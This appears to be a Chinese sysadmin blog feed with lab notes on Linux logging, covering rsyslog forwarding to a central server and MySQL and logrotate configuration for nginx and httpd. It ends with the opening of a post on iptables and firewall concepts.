title="常用日志"></a>常用日志</h1><p>lastb：查看错误登录的日志信息，这个貌似是每天都会清理的</p><p>/var/log/messages：系统通用日志</p><p>自定义local级别，自定义服务的日志设施facility到指定目录，重启服务</p><p>mysqld.log，MySQL通用日志</p><p>nginx，access.log：访问日志</p><p>errer.log：错误日志等等，基本如果是Yum安装的话，都会默认记录在/var/log/下面</p><p>journalctl：显示日志信息的语句，查看语句</p><h1 id="案例：使用MySQL进行日志的转储"><a href="#案例：使用MySQL进行日志的转储" class="headerlink" title="案例：使用MySQL进行日志的转储"></a>案例：使用MySQL进行日志的转储</h1><h2 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1.环境配置"></a>1.环境配置</h2><p>10.0.0.132 MySQL</p><p>10.0.0.128 rsyslog日志服务器</p><p>10.0.0.129 客户端，推送服务日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">128配置rsyslog服务<br>vim /etc/rsyslog.conf<br><span class="hljs-comment">#centos 7开启 tcp 514端口</span><br><span class="hljs-comment"># Provides TCP syslog reception</span><br><span class="hljs-variable">$ModLoad</span> imtcp<br><span class="hljs-variable">$InputTCPServerRun</span> 514<br><br>vim /etc/rsyslog.d/sshd.conf ---&gt;接收所有来自local6级别的日志，存储到client.log上面<br>local6.*                                /var/log/client.log<br><br>systemctl restart rsyslog<br>ss -ntl | grep 514<br>[root@master ~]<span class="hljs-comment">#ll /var/log/ | grep cli</span><br>-rw-------   1 root   root          141 Oct  1 11:44 client.log<br>[root@master ~]<span class="hljs-comment">#ss -ntl | grep 514</span><br>LISTEN     0      25           *:514                      *:*                  <br>LISTEN     0      25        [::]:514                   [::]:*  <br><br><span class="hljs-built_in">cat</span>查看<br>[root@master ~]<span class="hljs-comment">#cat /var/log/client.log </span><br>Oct  1 03:44:26 slave1 sshd[16300]: Server listening on 0.0.0.0 port 22.<br>Oct  1 03:44:26 slave1 sshd[16300]: Server listening on :: port 22.<br><br><br>129配置推送<br>---&gt;sshd_config更改<br><span class="hljs-comment">#SyslogFacility AUTH</span><br>SyslogFacility LOCAL6<br><span class="hljs-comment">#SyslogFacility AUTHPRIV</span><br><br>---&gt;建立推送机制<br>[03:46:33 root@slave1 ~]<span class="hljs-comment">#vim /etc/rsyslog.d/gerneral.conf</span><br>local6.*                                @@10.0.0.128:514<br><br>systemctl restart rsyslog sshd<br></code></pre></td></tr></table></figure><h2 id="2-安装rsyslog-mysql服务，推送日志"><a href="#2-安装rsyslog-mysql服务，推送日志" class="headerlink" title="2.安装rsyslog-mysql服务，推送日志"></a>2.安装rsyslog-mysql服务，推送日志</h2><p>安装rsyslog-mysql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">yum <span class="hljs-operator">-</span>y install rsyslog<span class="hljs-operator">-</span>mysql<br><br>[root<span class="hljs-variable">@rocky</span> <span class="hljs-operator">~</span>]#rpm <span class="hljs-operator">-</span>ql rsyslog<span class="hljs-operator">-</span>mysql<br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>.build<span class="hljs-operator">-</span>id<br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>.build<span class="hljs-operator">-</span>id<span class="hljs-operator">/</span>e6<br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>.build<span class="hljs-operator">-</span>id<span class="hljs-operator">/</span>e6<span class="hljs-operator">/</span>aa0e40c19a2e0524d72780eee3b1698684cbe7<br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib64<span class="hljs-operator">/</span>rsyslog<span class="hljs-operator">/</span>ommysql.so<br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>doc<span class="hljs-operator">/</span>rsyslog<span class="hljs-operator">/</span>mysql<span class="hljs-operator">-</span>createDB.sql<br><br>将初始化脚本复制到MySQL，创建账号，授权<br>scp <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>doc<span class="hljs-operator">/</span>rsyslog<span class="hljs-operator">/</span>mysql<span class="hljs-operator">-</span>createDB.sql <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span>:<span class="hljs-operator">/</span>root<br></code></pre></td></tr></table></figure><p>查看mysql-create脚本，其实就是创建一个syslog日志库，需要创建一个日志同步账号，给这个库授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs sql">[root<span class="hljs-variable">@rocky</span> <span class="hljs-operator">~</span>]#cat mysql<span class="hljs-operator">-</span>createDB.sql <br><span class="hljs-keyword">CREATE</span> DATABASE Syslog;<br>USE Syslog;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> SystemEvents<br>(<br>        ID <span class="hljs-type">int</span> unsigned <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> auto_increment <span class="hljs-keyword">primary</span> key,<br>        CustomerID <span class="hljs-type">bigint</span>,<br>        ReceivedAt datetime <span class="hljs-keyword">NULL</span>,<br>        DeviceReportedTime datetime <span class="hljs-keyword">NULL</span>,<br>        Facility <span class="hljs-type">smallint</span> <span class="hljs-keyword">NULL</span>,<br>        Priority <span class="hljs-type">smallint</span> <span class="hljs-keyword">NULL</span>,<br>        FromHost <span class="hljs-type">varchar</span>(<span class="hljs-number">60</span>) <span class="hljs-keyword">NULL</span>,<br>        Message text,<br>        NTSeverity <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        Importance <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        EventSource <span class="hljs-type">varchar</span>(<span class="hljs-number">60</span>),<br>        EventUser <span class="hljs-type">varchar</span>(<span class="hljs-number">60</span>) <span class="hljs-keyword">NULL</span>,<br>        EventCategory <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        EventID <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        EventBinaryData text <span class="hljs-keyword">NULL</span>,<br>        MaxAvailable <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        CurrUsage <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        MinUsage <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        MaxUsage <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span>,<br>        InfoUnitID <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span> ,<br>        SysLogTag <span class="hljs-type">varchar</span>(<span class="hljs-number">60</span>),<br>        EventLogType <span class="hljs-type">varchar</span>(<span class="hljs-number">60</span>),<br>        GenericFileName <span class="hljs-type">VarChar</span>(<span class="hljs-number">60</span>),<br>        SystemID <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> SystemEventsProperties<br>(<br>        ID <span class="hljs-type">int</span> unsigned <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> auto_increment <span class="hljs-keyword">primary</span> key,<br>        SystemEventID <span class="hljs-type">int</span> <span class="hljs-keyword">NULL</span> ,<br>        ParamName <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NULL</span> ,<br>        ParamValue text <span class="hljs-keyword">NULL</span><br>);<br><br>##执行授权，查看表<br>source <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>mysql<span class="hljs-operator">-</span>createDB.sql<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> rsyslog@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> Syslog.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> rsyslog@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush privileges;<br><br>[Syslog]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> tables;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------+</span><br><span class="hljs-operator">|</span> Tables_in_Syslog       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------+</span><br><span class="hljs-operator">|</span> SystemEvents           <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> SystemEventsProperties <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------+</span><br></code></pre></td></tr></table></figure><h2 id="3-调用-usr-lib64-rsyslog-ommysql-so这个模块进行推送"><a href="#3-调用-usr-lib64-rsyslog-ommysql-so这个模块进行推送" class="headerlink" title="3.调用/usr/lib64/rsyslog/ommysql.so这个模块进行推送"></a>3.调用/usr/lib64/rsyslog/ommysql.so这个模块进行推送</h2><p>编辑/etc/rsyslog.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##类似这个写法</span><br><span class="hljs-variable">$ModLoad</span> imtcp<br><span class="hljs-variable">$InputTCPServerRun</span> 514<br><br><span class="hljs-variable">$ModLoad</span> ommysql<br><br><span class="hljs-comment">##将所有的日志包括本地的通用日志推送到MySQL</span><br>*.info;mail.none;authpriv.none;cron.none                /var/log/messages<br>*.info;mail.none;authpriv.none;cron.none                :ommysql:10.0.0.132,Syslog,rsyslog,123 ---&gt;对应的库，远程连接的user，密码<br><br><span class="hljs-comment">##128重启服务，两张表已经有内容了</span><br>systemctl restart rsyslog<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232739713-1384965478.png" alt="image-20221001121152698"></p><p>systemevents推送记录了系统日志</p><p><img src="2792175-20221028232739213-1576500148.png" alt="image-20221001121454134"></p><p>成功记录了slave1机器的日志</p><p>slave1的messages也推送到MySQL内</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">*</span>.info;mail.none;authpriv.none;cron.none                <span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>log<span class="hljs-operator">/</span>messages<br><span class="hljs-operator">*</span>.info;mail.none;authpriv.none;cron.none                @<span class="hljs-variable">@10</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span><br><br>[Syslog]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> SystemEvents <span class="hljs-keyword">where</span> message <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%am%&#x27;</span>\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>                ID: <span class="hljs-number">22</span><br>        CustomerID: <span class="hljs-keyword">NULL</span><br>        ReceivedAt: <span class="hljs-number">2022</span><span class="hljs-number">-10</span><span class="hljs-number">-01</span> <span class="hljs-number">12</span>:<span class="hljs-number">19</span>:<span class="hljs-number">29</span><br>DeviceReportedTime: <span class="hljs-number">2022</span><span class="hljs-number">-10</span><span class="hljs-number">-01</span> <span class="hljs-number">04</span>:<span class="hljs-number">19</span>:<span class="hljs-number">29</span><br>          Facility: <span class="hljs-number">1</span><br>          Priority: <span class="hljs-number">5</span><br>          FromHost: slave1<br>           Message:  i am slave1<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232740130-872923460.png" alt="image-20221001141638531"></p><h1 id="日志转储logrotate"><a href="#日志转储logrotate" class="headerlink" title="日志转储logrotate"></a>日志转储logrotate</h1><p>切分日志，可以按照创建时间/日志文件大小来切分日志格式，比如可以一天创建一份日志，或者是达到100M自动生成一个新日志，类似mysql-binlog日志或者docker日志的max-size选项</p><p>还可以定义自动删除掉N天前的日志文件，保留最新的7天日志</p><p>包：logrotate</p><p>默认：一天执行一次拆分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master tmp]<span class="hljs-comment">#rpm -ql logrotate</span><br>/etc/cron.daily/logrotate<br>/etc/logrotate.conf<br>/etc/logrotate.d<br>/etc/rwtab.d/logrotate<br>/usr/sbin/logrotate<br><br><span class="hljs-comment">##调用这个logrotate的配置文件，如果状态码不等于0，则退出，警告logrotate执行失败</span><br>vim /etc/cron.daily/logrotate<br><span class="hljs-comment">#!/bin/sh</span><br><br>/usr/sbin/logrotate -s /var/lib/logrotate/logrotate.status /etc/logrotate.conf<br>EXITVALUE=$?<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$EXITVALUE</span> != 0 ]; <span class="hljs-keyword">then</span><br>    /usr/bin/logger -t logrotate <span class="hljs-string">&quot;ALERT exited abnormally with [<span class="hljs-variable">$EXITVALUE</span>]&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><h2 id="logrotate配置文件"><a href="#logrotate配置文件" class="headerlink" title="logrotate配置文件"></a>logrotate配置文件</h2><p>vim /etc/logrotate.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># see &quot;man logrotate&quot; for details</span><br><span class="hljs-comment"># rotate log files weekly ---&gt;其实是一周进行一次日志的切分</span><br>weekly<br><br><span class="hljs-comment"># keep 4 weeks worth of backlogs ---&gt;保留4周</span><br>rotate 4<br><br><span class="hljs-comment"># create new (empty) log files after rotating old ones ---&gt;创建一份新的日志，如果到期后</span><br>create<br><br><span class="hljs-comment"># use date as a suffix of the rotated file ---&gt;日志命名</span><br>dateext<br><br><span class="hljs-comment"># uncomment this if you want your log files compressed</span><br><span class="hljs-comment">#compress</span><br><br><span class="hljs-comment"># RPM packages drop log rotation information into this directory</span><br>include /etc/logrotate.d  ---&gt;读取子配置文件<br><br><span class="hljs-comment"># system-specific logs may be also be configured here.</span><br></code></pre></td></tr></table></figure><p>日志针对服务的转储策略，证明在/var/log下已经有这么多服务需要日志来记录了</p><p>ls /etc/logrotate.d</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky ~]<span class="hljs-comment">#ls /etc/logrotate.d</span><br>bootlog  chrony  dnf        httpd        kvm_stat  libvirtd.qemu  php-fpm  samba  syslog          wtmp<br>btmp     cups    firewalld  iscsiuiolog  libvirtd  numad          psacct   sssd   wpa_supplicant<br><br><span class="hljs-comment">##不同的服务，配置的日志保存规则，时间等都不一样</span><br><br><span class="hljs-comment">##cron定时任务日志</span><br><br><br><span class="hljs-built_in">cat</span> httpd<br>/var/log/httpd/*<span class="hljs-built_in">log</span> &#123; <span class="hljs-comment">##指定日志路径，为服务/程序默认的日志存放路径，这个</span><br>    missingok <span class="hljs-comment">##丢失了也OK</span><br>    notifempty <span class="hljs-comment">##如果当天的日志为空，则不切分</span><br>    sharedscripts<br>    delaycompress <span class="hljs-comment">##生成日志后延迟压缩</span><br>    postrotate<br>        /bin/systemctl reload httpd.service &gt; /dev/null 2&gt;/dev/null || <span class="hljs-literal">true</span><br>    endscript<br>&#125;<br><br><span class="hljs-built_in">cat</span> nginx<br>/apps/nginx/logs/*.<span class="hljs-built_in">log</span> &#123; <span class="hljs-comment">##指定日志路径，为服务/程序默认的日志存放路径，nginx默认有access.log或者error.log</span><br>daily <span class="hljs-comment">##每天切分日志，每天生成</span><br>rotate 5 <span class="hljs-comment">##保留最新的5分日志文件</span><br>    missingok <span class="hljs-comment">##丢失了也OK</span><br>    notifempty <span class="hljs-comment">##如果当天的日志为空，则不切分</span><br>    size 10M <span class="hljs-comment">##规则：超过10M的日志文件也进行转储</span><br>    compress <span class="hljs-comment">##压缩</span><br>    delaycompress <span class="hljs-comment">##生成日志后延迟压缩</span><br>    create 644 nginx nginx <span class="hljs-comment">##生成日志的属性，权限为644(rw-r--r--)，属组为nginx</span><br>    postrotate<br>        <span class="hljs-keyword">if</span> [ -f /apps/nginx/logs/nginx.pid ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">kill</span> -USR1 `<span class="hljs-built_in">cat</span> /apps/nginx/logs/nginx.pid` ---&gt;nginx的特性，发现日志的名字修改后，重新生成日志文件<br>        <span class="hljs-keyword">fi</span><br>    endscript<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232740637-467955986.png" alt="image-20221001232133445"></p><p>基于针对nginx服务做的日志切割，相关语法</p><h2 id="日志转储测试"><a href="#日志转储测试" class="headerlink" title="日志转储测试"></a>日志转储测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##生成2M的日志文件，模拟每天的记录</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/var/log/test1.<span class="hljs-built_in">log</span> bs=2M count=1<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/var/log/test2.<span class="hljs-built_in">log</span> bs=2M count=1<br><br>ll /var/log/test*<br>-rw-r--r--. 1 root root 2 10月  1 23:57 /var/log/test1.<span class="hljs-built_in">log</span><br>-rw-r--r--. 1 root root 2 10月  1 23:57 /var/log/test2.<span class="hljs-built_in">log</span><br><br><span class="hljs-comment">##配置日志转储规则，在这个目录下编辑好配置文件，默认是每天都生成一个日志的规则，daily，只要前一天的写完了，或者大小达到1M了，就需要切分了，切分规则按照主配置文件logrotate.conf来命名</span><br>vim /etc/logrotate.d/test1<br>/var/log/test1.<span class="hljs-built_in">log</span> &#123;<br>daily<br>rotate 3<br>compress <span class="hljs-comment">##自动压缩成gz文件，直接压缩了，可以的，匹配符合条件直接压缩，生成新的日志文件后，旧的日志文件直接压缩</span><br>missingok<br>size 1M <span class="hljs-comment">##触发大于1M的规则，转储</span><br>notifempty <br>create 644 root root<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">date</span> +%F_%T` &gt;&gt; /root/test1.<span class="hljs-built_in">log</span><br>endscript<br>&#125;<br><br>----主配置文件<br><span class="hljs-comment"># see &quot;man logrotate&quot; for details</span><br><span class="hljs-comment"># rotate log files weekly</span><br>weekly<br><br><span class="hljs-comment"># keep 4 weeks worth of backlogs</span><br>rotate 4<br><br><span class="hljs-comment"># create new (empty) log files after rotating old ones</span><br>create<br><br><span class="hljs-comment"># use date as a suffix of the rotated file</span><br>dateext ---&gt;按照日期命名<br><br><span class="hljs-comment"># uncomment this if you want your log files compressed</span><br><span class="hljs-comment">#compress</span><br><br><span class="hljs-comment"># RPM packages drop log rotation information into this directory</span><br>include /etc/logrotate.d<br><br><span class="hljs-comment"># system-specific logs may be also be configured here.</span><br><br><span class="hljs-comment">##直接调用，一般来说是cron.daily，每天执行一次的，得到一份压缩后的日志文件</span><br>[root@rocky cron.daily]<span class="hljs-comment">#pwd</span><br>/etc/cron.daily<br>logrotate<br><br>logrotate /etc/logrotate.d/test1<br>[root@rocky logrotate.d]<span class="hljs-comment">#ll /var/log/test*</span><br>-rw-r--r--. 1 root root       0 10月  2 00:04 /var/log/test1.<span class="hljs-built_in">log</span><br>-rw-r--r--. 1 root root    2067 10月  2 00:03 /var/log/test1.log.1.gz<br><br>[root@rocky logrotate.d]<span class="hljs-comment">#logrotate /etc/logrotate.d/test1</span><br>[root@rocky logrotate.d]<span class="hljs-comment">#ll /var/log/test*</span><br>-rw-r--r--. 1 root root       0 10月  2 00:16 /var/log/test1.<span class="hljs-built_in">log</span><br>-rw-r--r--. 1 root root 2097152 10月  2 00:16 /var/log/test1.log.1<br>-rw-r--r--. 1 root root    2067 10月  2 00:03 /var/log/test1.log.1.gz<br>-rw-r--r--. 1 root root 2097152 10月  2 00:03 /var/log/test2.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux防火墙技术</title>
    <link href="/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux防火墙技术"><a href="#Linux防火墙技术" class="headerlink" title="Linux防火墙技术"></a>Linux防火墙技术</h1><p><img src="2792175-20220828181112243-583103263.png" alt="image-20220727222535470"></p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">总结：<br>1.基于某个段的过滤：INPUT chain<br>2.本机作为iptables防火墙进行转发：FORWARD chain<br>3.作为NAT网关：在nat表(-t nat)，SNAT在POSTROUTING chain做转发-d为非内网网段(! -d 10.0.0.0/24)；DNAT在PREROUTING做转发(目标地址为外网地址)，destination为目标主机+端口<br></code></pre></td></tr></table></figure><p>基本的安全技术：</p><p>1.入侵检测系统：不阻拦外部攻击行为，检测出对应的攻击行为，一般都是监控系统，事后处理</p><p>2.入侵防御系统：阻断攻击行为，分析例如木马，蠕虫，系统漏洞等攻击行为，在线部署防火墙，SSH攻击，DDOS攻击等</p><p>3.防火墙：部署在整体网络架构的最外部，允许一些规则、流量流入，拒绝流量流入；</p><p>云环境：WAF(应用防火墙)，云防火墙(IP流量防火墙)</p><p>线下：部署在DMZ区，介于outbound和inbound之间，分为trust(信任区)和untrust(不信任区)</p><p>主机层面：防火墙，企业主机安全等(配额)</p><p>tar -xf：解压包</p><p>tar -czf：压缩包</p><p>tar -tvf：查看包内的文件</p><p>应用层防火墙：阿里云/华为云的WAF，用于url层面的防护，上传文件是否合法，大小写(七层)</p><p>网络层防火墙：边界防火墙，主要是针对IP层面的防护，流量级别的防护，IP+端口，包过滤防火墙</p><p>Internet：untrust区</p><p>防火墙</p><p>DMZ区：用于部署负载均衡，公司用的是硬件负载均衡F5，用于对外提供服务的服务区放置的，比如FTP服务器，WEB服务器网站等</p><p>内网：trust区，接入核心交换机—汇聚层—接入层等</p><h1 id="Linux内核防火墙iptables"><a href="#Linux内核防火墙iptables" class="headerlink" title="Linux内核防火墙iptables"></a>Linux内核防火墙iptables</h1><p>开源的防火墙功能，主要包括防火墙firewall，NAT以及数据包过滤等技术，存在于内核kernal中，无论是哪个防火墙软件，都是依赖于内核功能netfilter</p><p>centos6：iptables</p><p>centos7：firewalld</p><p>centos8：nft</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code 